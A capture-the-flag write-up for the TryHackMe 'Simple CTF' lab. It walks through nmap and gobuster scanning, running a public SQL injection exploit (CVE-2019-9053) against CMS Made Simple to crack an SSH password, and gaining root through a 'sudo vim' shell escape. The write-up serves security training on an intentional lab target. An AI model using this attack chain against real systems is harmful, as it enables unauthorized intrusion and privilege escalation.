# SIMPLE CTF 

## Room - https://tryhackme.com/room/easyctf

```bash
IP=<machine-ip>
mkdir nmap
```

## How many services are running under port 1000?
```bash
nmap -p 1000 -A -oN nmap/port_1000 $IP

cat nmap/port_1000

# ...
# Network Distance: 2 hops
# ...
```
### Answer: 2 services running


## What is running on the higher port?

```bash
nmap -sC -sV -oN nmap/initial $IP
# ...
# 21/tcp open ftp ...
# ...
# 80/tcp open http ... 
# ...
# 2222/tcp open ssh ...
#...

# Just to confirm there aren't any higher ports than 2222 open
nmap -p- nmap/all_ports $IP
```

### Answer (Highest port=2222): ssh


## What's the CVE you're using against the application?
```bash
gobuster dirb -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Found http://$IP/simple/
# On that found CMS Made Simple version 2.2.8

searchsploit "CMS Made Simple 2.2.8"

# Found CMS Made Simple < 2.2.10 - SQL Injection

searchsploit -m php/webapps/46635.py

mv 46635.py cms_exploit.py

head cms_exploit.py

# Found CVE: CVE-2019-9053
```

### Answer: CVE-2019-9053

## To what kind of vulnerability is the application vulnerable?

```bash
head cms_exploit.py

# Found Exploit Title: Unauthenticated SQL Injection ...
```

### Answer: SQLI

## What's the password?

```bash
python3 cms_exploit.py -c -u http://$IP/simple/ -w /usr/share/wordlists/rockyou.txt

# Found: 
# Username: mitch
# Password: secret
```

### Answer: secret

## Where can you login with the details obtained?

```bash
ssh -p 2222 mitch@$IP
```

### Answer: ssh

### What's the user flag?
```bash
# Inside ssh connection run

cat /home/mitch/user.txt
```

## Is there any other user in the home directory? What's its name?

```bash
ls -l /home/

# Found: sunbath
```

### Answer: sunbath

## What can you leverage to spawn a privileged shell?

```bash
sudo -l

# Found /usr/bin/vim
```

### Answer: vim

## What's the root flag?

```bash
sudo vim -c ':!/bin/sh' # https://gtfobins.github.io/gtfobins/vim/#sudo

cat root/root.txt
```

## Diogo Lobo, 11-07-2025
